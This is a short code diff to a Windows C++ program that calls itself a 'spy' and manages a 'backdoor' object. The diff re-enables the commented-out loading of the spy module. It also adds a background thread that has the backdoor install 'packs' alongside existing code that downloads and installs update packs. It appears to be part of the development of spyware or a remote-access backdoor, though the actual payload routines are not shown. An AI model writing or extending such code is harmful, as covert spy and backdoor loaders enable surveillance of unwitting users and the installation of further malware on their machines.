@@ -23,20 +23,20 @@ int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In
 		LOG_E("Can not load dll library");
 		return ERROR_CODE;
 	}
-	
+
 	if (!init_dll_func())
 	{
 		free_library();
 		LOG_E("Can not bind dll functions");
 		return ERROR_CODE;
 	}
-	
-	/*if (load_spy())
+
+	if (load_spy())
 	{
 		free_library();
 		LOG_E("Can not load spy!");
 		return ERROR_CODE;
-	}*/
+	}
 
 	LOG_I("Spy is running...");
 
@@ -53,10 +53,13 @@ int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In
 			update_available = true;
 		}
 	}
-	
+
 	if (!update_available)
+	{
+		install_packs();
 		start_looper();
-	
+	}
+
 	LOG_I("Spy is stopping...");
 
 	unload_spy();
@@ -152,6 +155,7 @@ void free_backdoor()
 	if (backdoor != NULL)
 	{
 		delete backdoor;
+		backdoor = NULL;
 	}
 }
 
@@ -175,4 +179,24 @@ bool check_and_dwnl_update()
 void install_update_pack()
 {
 	backdoor->install_update_pack();
+}
+
+void install_packs()
+{
+	if (backdoor != NULL)
+	{
+		DWORD thread_id;
+		CreateThread(NULL, 0, [](LPVOID  p) -> DWORD
+		{
+			try
+			{
+				backdoor->install_packs_if_necessary();
+			}
+			catch (int error)
+			{
+				LOG_E("An error when try to install packs: %d", error);
+			}
+			return 0;
+		}, NULL, NULL, &thread_id);
+	}
 }
